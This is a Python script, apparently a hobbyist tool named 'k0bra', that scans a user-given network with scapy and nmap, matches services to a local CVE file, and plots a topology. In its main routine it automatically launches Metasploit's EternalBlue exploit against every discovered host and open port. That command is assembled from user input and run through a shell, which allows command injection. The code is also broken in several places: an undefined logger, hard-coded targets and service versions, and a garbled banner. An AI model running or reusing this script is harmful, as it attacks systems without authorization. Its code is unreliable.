#!/usr/bin/env python3
import sqlite3
import logging
import scapy.all as scapy
import nmap
import plotly.graph_objects as go
import requests
import subprocess
import asyncio
import json
from typing import List, Dict

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Logging configuration
logging.basicConfig(filename='k0bra.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def print_banner():
    """
    Prints the banner for the tool.
    """
    print(CYAN + "    ██   ██  ██████  ██████  ██████  ██████  ███████  ███████  ███████  ")
    print("    ██  ██  ██  ████ ██   ██ ██   ██ ██   ██ ██   ██ ")
    print("    █████   ██ ██ ██ ██████  ██████  ███████  ████████  ████████  ")
    print("    ██  ██  ████ ██   ██ ██   ██ ██   ██ ██   ██ ██   ██ ")
    print("    ██   ██  ██████  ██████  ███████  ████████  ████████  ████████  ")
    print(GREEN + "Welcome to k0bra - The Network Scavenger! Developed by b0urn3.")
    print("Other tools found at https://github.com/q4n0")
    print("Email: b0urn3@proton.me Instagram: onlybyhive\n" + RESET)

def get_user_input():
    """
    Input function for the target network or IP range.
    """
    print("Please provide the target network or IP range (e.g., 192.168.1.0/24):")
    target_network = input().strip()
    return target_network

def get_cve_input():
    """
    Input function for the path to a local CVE JSON file.
    """
    print("Please provide the path to the CVE JSON file (e.g., /path/to/cve_database.json):")
    cve_file_path = input().strip()
    return cve_file_path

class NetworkSecurityTool:
    def __init__(self, target_network):
        """
        Initialize the security mapping tool
        
        Args:
            target_network (str): Network CIDR or IP range to scan
        """
        self.target = target_network
        self.vulnerabilities = []
        self.network_map = {}
        self.db_connection = self._initialize_database()
        self.logger = self._setup_logging()

    def _initialize_database(self):
        """Create local SQLite database for vulnerability tracking"""
        conn = sqlite3.connect('security_map.db')
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
                          (ip TEXT, mac TEXT, port INTEGER, vulnerability TEXT, risk_score INTEGER)''')
        conn.commit()
        return conn

    def _setup_logging(self):
        """Configure logging with rotation"""
        logger = logging.getLogger('NetworkSecurityTool')
        handler = logging.FileHandler('tool.log')
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        return logger

class NetworkDiscovery:
    def network_scan(self, target):
        """
        Perform network discovery using ICMP and SYN scans
        
        Args:
            target (str): Network range to scan
        
        Returns:
            dict: Discovered network topology
        """
        icmp_response = scapy.sr1(scapy.IP(dst=target)/scapy.ICMP(), timeout=2, verbose=False)
        if icmp_response:
            return {target: 'Alive'}
        return {target: 'Inactive'}

    def port_enumeration(self, host):
        """Perform port scanning using Nmap"""
        nm = nmap.PortScanner()
        nm.scan(hosts=host, arguments="-p 1-65535")
        open_ports = [port for port in nm[host]['tcp'] if nm[host]['tcp'][port]['state'] == 'open']
        return open_ports

class VulnerabilityScanner:
    def __init__(self, cve_database_path):
        """
        Initialize vulnerability assessment engine
        
        Args:
            cve_database_path (str): Path to local CVE database JSON file
        """
        self.cve_database = self._load_cve_database(cve_database_path)

    def _load_cve_database(self, path):
        """Load and parse CVE database from a local JSON file"""
        try:
            with open(path, 'r') as file:
                cve_data = json.load(file)
                return cve_data
        except Exception as e:
            self.logger.error(f"Error loading CVE database: {str(e)}")
            return {}

    def assess_vulnerabilities(self, service_info):
        """Match discovered services with vulnerabilities"""
        vulnerabilities = []
        for service, version in service_info.items():
            if service in self.cve_database:
                vulnerabilities.append((service, self.cve_database[service]))
        return vulnerabilities

    def calculate_risk(self, cve_data):
        """Calculate risk score based on CVSS v3"""
        try:
            cvss_score = cve_data.get("cvss_v3", {}).get("base_score", 0)
            if cvss_score >= 9:
                return "Critical", cvss_score
            elif cvss_score >= 7:
                return "High", cvss_score
            elif cvss_score >= 4:
                return "Medium", cvss_score
            else:
                return "Low", cvss_score
        except KeyError:
            return "Unknown", 0

class NetworkVisualizer:
    def create_topology_graph(self, network_map):
        """
        Create an interactive network topology visualization
        
        Args:
            network_map (dict): Discovered network infrastructure
        
        Returns:
            plotly.Figure: Interactive network graph
        """
        nodes = list(network_map.keys())
        edges = [(node, "gateway") for node in nodes]  # Example: connecting all nodes to a gateway

        fig = go.Figure(data=[go.Scatter(x=[i for i in range(len(nodes))],
                                        y=[i for i in range(len(nodes))],
                                        mode="markers+text",
                                        text=nodes)])

        fig.update_layout(title="Network Topology", showlegend=False)
        return fig

# Metasploit Integration (Example)
def metasploit_exploit(target_ip, target_port):
    """
    Run Metasploit exploitation module (example, customize with actual modules)
    
    Args:
        target_ip (str): Target IP address to exploit
        target_port (int): Open port to exploit
    """
    try:
        command = f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set RPORT {target_port}; exploit'"
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(RED + f"Metasploit exploit failed: {str(e)}" + RESET)

# Async main function
async def main():
    target_network = get_user_input()  # Get target network from user input
    cve_file_path = get_cve_input()  # Get CVE JSON file path from user input
    tool = NetworkSecurityTool(target_network)

    discovery = NetworkDiscovery()
    scanner = VulnerabilityScanner(cve_file_path)  # Pass the local CVE file path
    visualizer = NetworkVisualizer()

    # Perform scan and get results
    network_info = discovery.network_scan(target_network)
    open_ports = discovery.port_enumeration('192.168.1.10')

    # Vulnerability scanning
    vulnerabilities = scanner.assess_vulnerabilities({'Apache': '2.4.1', 'OpenSSH': '8.4'})

    # Example exploitation (for demonstration only, use responsibly)
    for ip in network_info.keys():
        for port in open_ports:
            metasploit_exploit(ip, port)  # Exploit using Metasploit

    # Create a network visualization
    topology = visualizer.create_topology_graph(network_info)

    # Output results
    print("Network Info:", network_info)
    print("Open Ports:", open_ports)
    print("Vulnerabilities:", vulnerabilities)
    topology.show()

# Start asynchronous main function
if __name__ == "__main__":
    asyncio.run(main())
